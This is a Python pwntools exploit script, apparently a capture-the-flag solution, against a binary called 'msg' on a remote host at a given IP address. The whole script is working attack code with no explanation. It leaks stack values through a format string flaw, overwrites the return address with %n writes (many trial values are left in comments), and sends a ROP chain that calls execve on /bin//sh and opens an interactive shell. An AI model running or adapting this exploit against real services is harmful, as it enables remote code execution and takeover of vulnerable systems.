
from pwn import *
from time import sleep

context.binary = ELF('./msg')

def get_p():
    debug = False

    if not debug:
#        return remote('ncsc.ccis.no', 1344)
        return remote('128.39.143.166', 1340)
    else:
        return process(context.binary.path)


def set_message(p,x):
    p.sendline('1')
    p.recvuntil("message:")
    p.sendline(x)

def print_message(p):
    p.sendline('3')

def remove_message(p):
    p.sendline('2')

def dump_stack(p):

    stack = []
    for i in range(1, 100):

        payload = "%{}$x".format(i)
        p.recvuntil("Quit")
        remove_message(p)
        p.recvuntil("Quit")
        set_message(p, payload)
        p.recvuntil("Quit")
        p.sendline("3")
        p.recvline()
        item = p.recvline()
        stack.append(item)
    return [hex(int(x.strip('\n').strip(),16)) for x in stack]


p = get_p()
#gdb.attach(p)

stack = dump_stack(p)
remove_message(p)
#print stack

print hex(int(stack[0], 16))


main_ret = int(stack[0], 16) - 0x484
print stack
print hex(main_ret)


def pad(s):
    return s + "A" * (0x200 - len(s))

# 0xaabbccdd
#   ^  ^ ^ ^
#   3 2  1 0
setup  = ''
setup += p32(main_ret)
setup += p32(main_ret + 1)
setup += p32(main_ret + 2)
setup += p32(main_ret + 3)

#0x0804ab87

#setup += "%71x%3$n"
#setup += "%100x%4$n"
#setup += "%87x%5$n"
#setup += "%254x%6$n"

#setup += "%88x%3$n"
#setup += "%117x%4$n"
#setup += "%104x%5$n"
#setup += "%261x%6$n"

#08050AE8
#setup += "%216x%4$n" #0xe8
#setup += "%34x%5$n" #0x0a
#setup += "%251x%6$n" #0x05
#setup += "%259x%7$n" #0x08


#0x0809b9ff
#setup += "%239x%4$n" #ff
#setup += "%186x%5$n" #b9
#setup += "%80x%6$n" #09
#setup += "%255x%7$n" #08

#0x08053dea
#setup += "%218x%4$n"
#setup += "%83x%5$n"
#setup += "%200x%6$n"
#setup += "%259x%7$n"

#0x080b3c96 <-- spawning infinite loop?
#setup += "%134x%4$n"
#setup += "%166x%5$n"
#setup += "%207x%6$n"
#setup += "%253x%7$n"

#0x0804ab84
#setup += "%116x%4$n"
#setup += "%39x%5$n"
#setup += "%89x%6$n"
#setup += "%260x%7$n"

#0x080b2bbe
#setup += "%174x%4$n"
#setup += "%109x%5$n"
#setup += "%224x%6$n"
#setup += "%253x%7$n"

#0x080847a7
#setup += "%151x%4$n"
#setup += "%160x%5$n"
#setup += "%193x%6$n"
#setup += "%256x%7$n"

#0x0805ee6e <-- segfaults
#setup += "%94x%4$n"
#setup += "%128x%5$n"
#setup += "%23x%6$n"
#setup += "%259x%7$n"

#0x080bff09
# -> fucker med offset i stack
#setup += "%249x%4$n"
#setup += "%246x%5$n"
#setup += "%12x%6$n"
#setup += "%253x%7$n"

#0x080a7e93 <--- works
setup += "%131x%4$n"
setup += "%235x%5$n"
setup += "%140x%6$n"
setup += "%254x%7$n"

from struct import pack
payload  = ''
payload += p32(0x80847ab) * 5 #gotta align dat stack
payload += pack('<I', 0x0806fefb) # pop edx ; ret
payload += pack('<I', 0x080f3000) # @ .data
payload += pack('<I', 0x080bed76) # pop eax ; ret
payload += '/bin'
payload += pack('<I', 0x08057eaa) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806fefb) # pop edx ; ret
payload += pack('<I', 0x080f3004) # @ .data + 4
payload += pack('<I', 0x080bed76) # pop eax ; ret
payload += '//sh'
payload += pack('<I', 0x08057eaa) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806fefb) # pop edx ; ret
payload += pack('<I', 0x080f3008) # @ .data + 8
payload += pack('<I', 0x08057470) # xor eax, eax ; ret
payload += pack('<I', 0x08057eaa) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0804901e) # pop ebx ; ret
payload += pack('<I', 0x080f3000) # @ .data
payload += pack('<I', 0x0806ff22) # pop ecx ; pop ebx ; ret
payload += pack('<I', 0x080f3008) # @ .data + 8
payload += pack('<I', 0x080f3000) # padding without overwrite ebx
payload += pack('<I', 0x0806fefb) # pop edx ; ret
payload += pack('<I', 0x080f3008) # @ .data + 8
payload += pack('<I', 0x08057470) # xor eax, eax ; ret
payload += pack('<I', 0x0807d31a) # inc eax ; ret
payload += pack('<I', 0x0807d31a) # inc eax ; ret
payload += pack('<I', 0x0807d31a) # inc eax ; ret
payload += pack('<I', 0x0807d31a) # inc eax ; ret
payload += pack('<I', 0x0807d31a) # inc eax ; ret
payload += pack('<I', 0x0807d31a) # inc eax ; ret
payload += pack('<I', 0x0807d31a) # inc eax ; ret
payload += pack('<I', 0x0807d31a) # inc eax ; ret
payload += pack('<I', 0x0807d31a) # inc eax ; ret
payload += pack('<I', 0x0807d31a) # inc eax ; ret
payload += pack('<I', 0x0807d31a) # inc eax ; ret
payload += pack('<I', 0x0804a4da) # int 0x80

exp = pad(setup + payload)
p.recvuntil("Quit")
p.sendline("1")
p.recvuntil("message:")
p.sendline(exp)
p.recvuntil("Quit")
p.sendline("3")

p.interactive()




